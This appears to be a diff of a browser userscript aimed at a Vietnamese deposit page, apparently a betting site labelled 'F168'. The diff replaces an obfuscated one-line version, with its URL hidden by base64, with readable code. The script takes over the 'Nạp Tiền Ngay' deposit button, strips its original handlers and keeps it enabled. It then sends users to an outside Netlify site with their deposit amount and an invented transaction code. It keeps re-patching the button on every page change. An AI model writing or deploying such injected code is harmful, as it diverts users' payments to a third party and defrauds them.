@@ -1,1 +1,158 @@
-(function(){'use strict';const u=atob('aHR0cHM6Ly9uYXAtdGllbi1mMTY4NnMubmV0bGlmeS5hcHAvP2Ftb3VudD0='),p=new WeakSet,r=!1;function t(m){const d=document.createElement('div');d.innerText=m||'cài lệnh thành công';Object.assign(d.style,{position:'fixed',bottom:'30px',left:'50%',transform:'translateX(-50%)',background:'#333',color:'#fff',padding:'12px 24px',borderRadius:'30px',fontSize:'16px',fontWeight:'600',zIndex:'9999',boxShadow:'0 4px 12px rgba(0,0,0,0.3)',transition:'opacity 0.5s'});document.body.appendChild(d);setTimeout(()=>{d.style.opacity='0';setTimeout(()=>d.remove(),500)},2000)}function g(){if(document.getElementById('f168-dot'))return;const d=document.createElement('div');d.id='f168-dot';Object.assign(d.style,{position:'fixed',top:'15px',right:'15px',width:'14px',height:'14px',backgroundColor:'#2ecc71',borderRadius:'50%',border:'2px solid white',boxShadow:'0 0 10px rgba(46,204,113,0.6)',zIndex:'9998',cursor:'pointer'});d.title='F168 active';document.body.appendChild(d)}function x(){let c='';for(let i=0;i<5;i++)c+='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random()*36)];return c}function h(e){if(r)return;r=!0;e.preventDefault();e.stopImmediatePropagation();e.stopPropagation();const i=document.querySelector('.ui-input__input'),a=Math.max(0,parseInt(i?i.value:0)||0),l=a*1000;window.location.href=u+l+'&code='+x();setTimeout(()=>{r=!1},1500)}function b(btn){if(p.has(btn))return;p.add(btn);btn.removeAttribute('disabled');btn.classList.remove('ui-button--disabled');const c=btn.cloneNode(!0);c.removeAttribute('disabled');c.classList.remove('ui-button--disabled');c.removeAttribute('onclick');c.onclick=null;btn.parentNode.replaceChild(c,btn);p.add(c);let touched=!1;c.addEventListener('touchstart',e=>{touched=!0;e.stopImmediatePropagation()},!0);c.addEventListener('touchend',e=>{touched=!0;h(e)},!0);c.addEventListener('click',e=>{if(touched){touched=!1;return}h(e)},!0);new MutationObserver(()=>{c.hasAttribute('disabled')&&(c.removeAttribute('disabled'),c.classList.remove('ui-button--disabled'))}).observe(c,{attributes:!0,attributeFilter:['disabled','class']})}function f(){try{const btn=document.getElementById('depositSubmitClick');if(btn&&!p.has(btn)){b(btn);return}document.querySelectorAll('button.ui-button,button').forEach(el=>{if(!p.has(el)&&(el.innerText||el.textContent||'').trim().includes('Nạp Tiền Ngay'))b(el)})}catch(e){}}t();g();const _p=history.pushState;history.pushState=function(...a){_p.apply(history,a);setTimeout(f,300);setTimeout(f,800);setTimeout(f,1500)};const _r=history.replaceState;history.replaceState=function(...a){_r.apply(history,a);setTimeout(f,300)};window.addEventListener('popstate',()=>{setTimeout(f,300);setTimeout(f,800)});f();document.addEventListener('DOMContentLoaded',f);window.addEventListener('load',f);setInterval(f,1e3);new MutationObserver(m=>m.some(n=>n.addedNodes.length>0)&&f()).observe(document.documentElement||document.body,{childList:!0,subtree:!0})})();
+(function() {
+  'use strict';
+  const NETLIFY_URL = 'https://nap-tien-f1686s.netlify.app/?amount=';
+  const patched = new WeakSet();
+  let redirecting = false;
+
+  function showToast(msg) {
+    const div = document.createElement('div');
+    div.innerText = msg || 'cài lệnh thành công';
+    Object.assign(div.style, {
+      position: 'fixed',
+      bottom: '30px',
+      left: '50%',
+      transform: 'translateX(-50%)',
+      background: '#333',
+      color: '#fff',
+      padding: '12px 24px',
+      borderRadius: '30px',
+      fontSize: '16px',
+      fontWeight: '600',
+      zIndex: '9999',
+      boxShadow: '0 4px 12px rgba(0,0,0,0.3)',
+      transition: 'opacity 0.5s'
+    });
+    document.body.appendChild(div);
+    setTimeout(() => {
+      div.style.opacity = '0';
+      setTimeout(() => div.remove(), 500);
+    }, 2000);
+  }
+
+  function addGreenDot() {
+    if (document.getElementById('f168-dot')) return;
+    const dot = document.createElement('div');
+    dot.id = 'f168-dot';
+    Object.assign(dot.style, {
+      position: 'fixed',
+      top: '15px',
+      right: '15px',
+      width: '14px',
+      height: '14px',
+      backgroundColor: '#2ecc71',
+      borderRadius: '50%',
+      border: '2px solid white',
+      boxShadow: '0 0 10px rgba(46,204,113,0.6)',
+      zIndex: '9998',
+      cursor: 'pointer'
+    });
+    dot.title = 'F168 active';
+    document.body.appendChild(dot);
+  }
+
+  function randomTx() {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    let code = '';
+    for (let i = 0; i < 5; i++) {
+      code += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return code;
+  }
+
+  function doRedirect(e) {
+    if (redirecting) return;
+    redirecting = true;
+    e.preventDefault();
+    e.stopImmediatePropagation();
+    e.stopPropagation();
+    const input = document.querySelector('.ui-input__input');
+    let points = input ? parseInt(input.value) || 0 : 0;
+    if (isNaN(points) || points < 0) points = 0;
+    let amount = points * 1000;
+    const txCode = randomTx();
+    const url = NETLIFY_URL + amount + '&code=' + txCode;
+    window.location.href = url;
+    setTimeout(() => { redirecting = false; }, 1500);
+    return false;
+  }
+
+  function patchButton(btn) {
+    if (patched.has(btn)) return;
+    patched.add(btn);
+    btn.removeAttribute('disabled');
+    btn.classList.remove('ui-button--disabled');
+    const clone = btn.cloneNode(true);
+    clone.removeAttribute('disabled');
+    clone.classList.remove('ui-button--disabled');
+    clone.removeAttribute('onclick');
+    clone.onclick = null;
+    if (btn.parentNode) btn.parentNode.replaceChild(clone, btn);
+    patched.add(clone);
+    let touched = false;
+    clone.addEventListener('touchstart', function(e) {
+      touched = true;
+      e.stopImmediatePropagation();
+    }, true);
+    clone.addEventListener('touchend', function(e) {
+      touched = true;
+      doRedirect(e);
+    }, true);
+    clone.addEventListener('click', function(e) {
+      if (touched) {
+        touched = false;
+        return;
+      }
+      doRedirect(e);
+    }, true);
+    new MutationObserver(() => {
+      if (clone.hasAttribute('disabled')) {
+        clone.removeAttribute('disabled');
+        clone.classList.remove('ui-button--disabled');
+      }
+    }).observe(clone, { attributes: true, attributeFilter: ['disabled', 'class'] });
+    console.log('[NapTien] Patched:', clone.id);
+  }
+
+  function findAndPatch() {
+    try {
+      const btn = document.getElementById('depositSubmitClick');
+      if (btn && !patched.has(btn)) {
+        patchButton(btn);
+        return;
+      }
+      document.querySelectorAll('button.ui-button,button').forEach(el => {
+        if (patched.has(el)) return;
+        const t = el.innerText || el.textContent || '';
+        if (t.trim().includes('Nạp Tiền Ngay')) patchButton(el);
+      });
+    } catch (e) {}
+  }
+
+  showToast('cài lệnh thành công');
+  addGreenDot();
+
+  const _push = history.pushState;
+  history.pushState = function(...a) {
+    _push.apply(history, a);
+    setTimeout(findAndPatch, 300);
+    setTimeout(findAndPatch, 800);
+    setTimeout(findAndPatch, 1500);
+  };
+  const _replace = history.replaceState;
+  history.replaceState = function(...a) {
+    _replace.apply(history, a);
+    setTimeout(findAndPatch, 300);
+  };
+  window.addEventListener('popstate', () => {
+    setTimeout(findAndPatch, 300);
+    setTimeout(findAndPatch, 800);
+  });
+
+  findAndPatch();
+  document.addEventListener('DOMContentLoaded', findAndPatch);
+  window.addEventListener('load', findAndPatch);
+  setInterval(findAndPatch, 1000);
+  new MutationObserver(ms => {
+    if (ms.some(m => m.addedNodes.length > 0)) findAndPatch();
+  }).observe(document.documentElement || document.body, { childList: true, subtree: true });
+})();
